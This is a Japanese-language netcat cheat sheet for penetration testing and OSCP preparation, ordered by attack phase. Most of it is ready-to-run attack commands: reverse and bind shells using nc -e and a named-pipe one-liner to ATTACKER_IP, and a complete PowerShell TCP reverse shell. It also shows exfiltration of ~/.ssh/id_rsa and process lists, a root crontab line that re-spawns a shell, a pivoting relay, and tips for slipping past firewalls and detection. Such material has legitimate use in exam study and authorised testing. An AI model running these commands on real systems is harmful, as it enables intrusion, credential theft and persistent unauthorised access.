# netcat (nc)

## 🎯 概要
**Netcat (nc)** は、TCPまたはUDPプロトコルを使用してネットワーク接続を読み書きするための「ネットワークのスイスアーミーナイフ」と称される万能ツールです。ペネトレーションテストやOSCPにおいて、Netcatはバナーグラビング、ポートスキャン、ファイル転送、そして何よりも**リバースシェルやバインドシェルの確立**における核心的なツールとして機能します。非常に軽量でありながら、スクリプトと組み合わせることで高度なバックドアやリレー（Pivoting）の構築も可能です。

---

## 🛠 代表的な用途
- **シェルアクセス**: ターゲットへの初期侵入時や権限昇格後のリモート操作（リバースシェル/バインドシェル）。
- **ポートスキャン・バナー調査**: 特定のポートが開放されているか、どのようなサービスが動いているかの確認。
- **ファイル転送**: ターゲットマシンと攻撃マシンの間でのエクスプロイトコードや戦利品データの受け渡し。
- **簡易チャット・バックドア**: 2台の端末間での簡易的な通信路の確保。
- **OSCPでの利用ポイント**: リバースシェルのリスナーとして最も頻繁に使用されます。また、環境によって `-e` オプションが使えない場合の「名前付きパイプ」を用いた代替ペイロードの知識が試されます。

---

## 🔍 基本コマンド
```bash
# 特定のIPとポートに接続
nc <TARGET_IP> <PORT>

# 接続を待機（リスナーモード）
nc -lvp <PORT>

# 特定の範囲のポートをスキャン（-z はスキャンモード）
nc -zv <TARGET_IP> 20-80

# UDPモードで接続（デフォルトはTCP）
nc -u <TARGET_IP> <PORT>
```

---

## 🧪 よく使う攻撃シナリオ
- **リバースシェルのキャッチ**: ターゲット側で実行されたシェルコードを受け取り、インタラクティブな操作を可能にする。
- **データエクスフィルトレーション（機密奪取）**: データベースのバックアップファイルやSSH秘密鍵などを、Netcatを介して攻撃者のサーバーへ転送する。
- **バナーグラビングによる脆弱性特定**: 接続時に表示されるサービスのバナー情報を取得し、既知の脆弱性（CVE）を特定する。

---

## 📌 フェーズ別コマンド例  

### 🔎 Reconnaissance（技術的偵察）
```bash
# ターゲットのポート80番に接続し、サーバーのバナー情報を手動で取得
echo -ne "HEAD / HTTP/1.0\r\n\r\n" | nc <TARGET_IP> 80

# Ncatを使用してSSL/TLSポートの証明書情報を確認
ncat --ssl -v <TARGET_IP> 443
```

---

### 🧭 Enumeration（詳細調査）
```bash
# 特定のホストのTCPポート範囲（1-1000）を高速にスキャン
nc -nvz <TARGET_IP> 1-1000

# UDPポート（例：SNMP 161番）の応答を確認
nc -unvz <TARGET_IP> 161

# Webサーバー上の特定のディレクトリに対してGETリクエストを送信
echo -ne "GET /admin HTTP/1.1\r\nHost: <DOMAIN>\r\n\r\n" | nc <TARGET_IP> 80
```

---

### 🚪 Initial Access（初期侵入）
```bash
# 攻撃者側でリバースシェルを待ち受けるリスナーを起動
nc -lvnp 4444

# ターゲット側でリバースシェルを実行（-e オプションがある場合）
nc <ATTACKER_IP> 4444 -e /bin/bash

# ターゲット側でバインドシェルを起動（-e オプションがある場合）
nc -lvnp 4444 -e /bin/bash

# ターゲット側に -e オプションがない場合の名前付きパイプ（FIFO）によるリバースシェル
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER_IP> 4444 > /tmp/f
```

---

### 📋 Local Enumeration（侵入後のローカル調査）
```bash
# ローカルでリッスンしているポートを内部から確認（外部から見えないサービス用）
nc -zv 127.0.0.1 1-65535

# 自身のシステムから外部（攻撃者サーバー）への疎通ポートを確認（Outboundフィルタ調査）
for port in 80 443 53 445; do nc -zv <ATTACKER_IP> $port; done
```

---

### 🔑 Credential Access（認証情報探索）
```bash
# SSH秘密鍵をファイルとして転送（攻撃者側で受信準備）
# 攻撃者側:
nc -lvp 9001 > id_rsa
# ターゲット側:
nc <ATTACKER_IP> 9001 < ~/.ssh/id_rsa
```

---

### 📈 Privilege Escalation（権限昇格）
```bash
# cronジョブを利用して定期的にルート権限でリバースシェルを起動させる
echo "* * * * * root /bin/nc <ATTACKER_IP> 4444 -e /bin/bash" >> /etc/crontab

# SUID権限を持つncが存在する場合の特権昇格
nc -lvnp 8888 -e /bin/sh
```

---

### 🚪 Pivot / Port Forward（内部サービスへのアクセス）
```bash
# Netcatリレーによるポートフォワーディング（内部のDBポート3306を外部へ中継）
# ターゲット上のFIFOを利用:
mkfifo /tmp/relay; nc -lvp 4455 0</tmp/relay | nc <INTERNAL_DB_IP> 3306 >/tmp/relay
```

---

## 🧰 便利オプション一覧
- `-l`：リスナーモード。接続を待ち受けます。
- `-v`：詳細表示（verbose）。接続状況を表示します。
- `-n`：名前解決をしない。DNSを介さずIPを直接扱うことで速度を上げ、ログを減らします。
- `-p <port>`：ポート番号を指定します。
- `-z`：ゼロI/Oモード。スキャンに使用され、データを送信しません。
- `-u`：UDPモード。
- `-w <secs>`：接続のタイムアウト時間を指定します。
- `-e <cmd>`：接続確立後に実行するプログラムを指定します（セキュリティ上の理由で無効な版が多い）。

---

## 🚀 実践例（10個以上）

```bash
# 【1】最も一般的なリバースシェル用リスナー（OSCP必須）
nc -lvnp 4444

# 【2】Windows環境でPowerShellをリバースシェルとして送信
powershell -c "$c=New-Object Net.Sockets.TCPClient('<IP>',4444);$s=$c.GetStream();$b=New-Object Byte[] 1024;while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$z=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$t=(iex $z 2>&1 | Out-String );$x=$t+'PS '+(pwd).Path+'> ';$y=([Text.Encoding]::ASCII).GetBytes($x);$s.Write($y,0,$y.Length);$s.Flush()};$c.Close()"

# 【3】攻撃者からターゲットへ「エクスプロイトコード」を転送
# 攻撃者側:
nc -lvp 1234 < exploit.py
# ターゲット側:
nc <ATTACKER_IP> 1234 > exploit.py

# 【4】全ポートに対する高速なオープンポートチェック
nc -nvz -w 1 <TARGET_IP> 1-65535

# 【5】HTTPレスポンスヘッダー全体を表示して技術スタックを特定
printf "GET / HTTP/1.1\r\nHost: <IP>\r\n\r\n" | nc <IP> 80

# 【6】Ncatを使用してSSL暗号化されたリバースシェルをキャッチ（検知回避用）
ncat --ssl -lvnp 443

# 【7】名前付きパイプによるバインドシェルの作成
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | nc -lvp 1234 > /tmp/s

# 【8】ターゲット環境の全プロセスリストをワンライナーで奪取
# 攻撃者側:
nc -lvp 9999 > processes.txt
# ターゲット側:
ps aux | nc <ATTACKER_IP> 9999

# 【9】IRCなどのテキストベースのプロトコルに手動で接続して対話
nc <TARGET_IP> 6667
PASS none
NICK test_user
USER test_user 0 * :Real Name

# 【10】特定のポートでのコネクションが切れるまで待機し、次の攻撃へ繋げる
nc -z <IP> <PORT> && echo "Port is open, starting next phase..."

# 【11】UDPベースのDNSサーバーの稼働をチェック
nc -vuz <TARGET_IP> 53

# 【12】Windowsのnc.exeを使用してコマンドプロンプトを外部へ公開
nc.exe -lvp 4444 -e cmd.exe
```

---

## 🧩 他ツールとの組み合わせ
- **msfvenom** → `msfvenom` で生成したリバースシェルペイロード（`cmd/unix/reverse_netcat`など）の接続先としてNetcatを使用します。
- **rlwrap** → `rlwrap nc -lvnp 4444` とすることで、取得したNetcatシェルで「コマンド履歴」や「矢印キー」の使用が可能になり、操作性が劇的に向上します。
- **impacket** → `psexec.py` などでターゲットにコマンド実行権限を得た後、Netcatをアップロードして永続的なシェルを確立します。
- **bash** → `/dev/tcp/<IP>/<PORT>` へのリダイレクトとNetcatリスナーを組み合わせて、ツールが少ない環境でのシェル取得を行います。

---

## 📝 注意点（OSCP 試験での使い方）
- **バイナリの有無**: WindowsターゲットにはデフォルトでNetcatは入っていません。`certutil.exe` や `powershell` を使って `nc.exe` を転送する必要があります。
- **Traditional vs. OpenBSD**: Linuxには複数のNetcatがあります。`-e` オプションが使えない場合は「OpenBSD版」です。その際は「名前付きパイプ」のペイロードを使用してください。
- **Firewallの回避**: ポート4444などはFWで遮断されやすいため、80(HTTP)や443(HTTPS)、53(DNS)などの一般的なポートをリバースシェルのポートとして利用するのが定石です。

---

## 🔗 参考リンク
- 公式 (GNU)：[GNU Netcat Project](http://netcat.sourceforge.net/)
- 公式 (Nmap/Ncat)：[Ncat Users' Guide](https://nmap.org/ncat/guide/index.html)
- 攻略の定番：[Pentestmonkey Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
